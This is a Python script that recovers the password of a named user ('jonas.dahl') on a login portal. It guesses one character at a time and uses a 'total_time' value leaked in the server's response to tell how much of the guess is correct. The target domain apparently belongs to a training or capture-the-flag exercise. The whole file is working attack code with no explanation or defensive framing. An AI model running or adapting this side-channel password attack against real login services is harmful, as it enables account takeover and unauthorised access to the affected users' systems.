import requests
import json
def cyclic_character_generator():
    while True:
        for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789':
            yield char

def replace_character(input_string, index, new_char):
    string_list = list(input_string)
    string_list[index] = new_char
    modified_string = ''.join(string_list)

    return modified_string

def send_post_request(data):
    url = "https://portal.regjeringen.uiaikt.no/login"
    try:
        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }

        response = requests.post(url, data=json.dumps(data), headers=headers)
        response.raise_for_status()

        content_type = response.headers.get('content-type', '').lower()

        if 'application/json' in content_type:
            try:
                response_data = response.json()
                print("JSON response content:")
                print(response_data)

                # Extract and print total_time from response
                total_time = response_data.get('total_time') if response_data else None
                if total_time is not None:
                    print(f"Total Time: {total_time}")
                    return total_time

            except ValueError as json_error:
                print(f"Error processing JSON: {json_error}")
        else:
            # Debugging response print(f"Non-JSON response content: {response.text}")

            # Attempt to extract 'total_time' directly from the response text
            total_time = None
            try:
                total_time_index = response.text.find('"total_time":')
                if total_time_index != -1:
                    total_time_str = response.text[total_time_index + len('"total_time":'):].split(',')[0]
                    total_time = int(total_time_str.strip('{}" '))
                    print(f"Total Time: {total_time}")
            except ValueError as value_error:
                print(f"Error extracting total_time from response: {value_error}")

        if response.status_code == 200:
            print("Request was successful!")
            return total_time  # Return total_time, even if it's None
        else:
            print(f"Request failed with status code: {response.status_code}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None

def test_passwords(username, password):
    global total_time
    print("-" * 35)
    print(f"Testing password: {password}")
    total_time = send_post_request({'username': username, 'password': password})
    return total_time

if __name__ == "__main__":
    username = "jonas.dahl"
    starting_password = "aaaaaaaaaaaaaaa23"
    modified_string = "aaaaaaaaaaaaaaa23"
    total_time = 0

    generator = cyclic_character_generator()

    while True:
        if total_time == 0:
            test_passwords(username, starting_password)
        elif total_time == 1:
            while total_time == 1:
                replacement_index = 0
                new_character = next(generator)
                modified_string = replace_character(starting_password, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 2:
            while total_time == 2:
                replacement_index = 1
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 3:
            while total_time == 3:
                replacement_index = 2
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 4:
            while total_time == 4:
                replacement_index = 3
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 5:
            while total_time == 5:
                replacement_index = 4
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 6:
            while total_time == 6:
                replacement_index = 5
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 7:
            while total_time == 7:
                replacement_index = 6
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 8:
            while total_time == 8:
                replacement_index = 7
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 9:
            while total_time == 9:
                replacement_index = 8
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 10:
            while total_time == 10:
                replacement_index = 9
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 11:
            while total_time == 11:
                replacement_index = 10
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 12:
            while total_time == 12:
                replacement_index = 11
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 13:
            while total_time == 13:
                replacement_index = 12
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 14:
            while total_time == 14:
                replacement_index = 13
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        elif total_time == 15:
            while total_time == 15:
                replacement_index = 14
                new_character = next(generator)
                modified_string = replace_character(modified_string, replacement_index, new_character)
                test_passwords(username, modified_string)
        else:
            print("-" * 35)
            print("The password is: " + modified_string)
            break

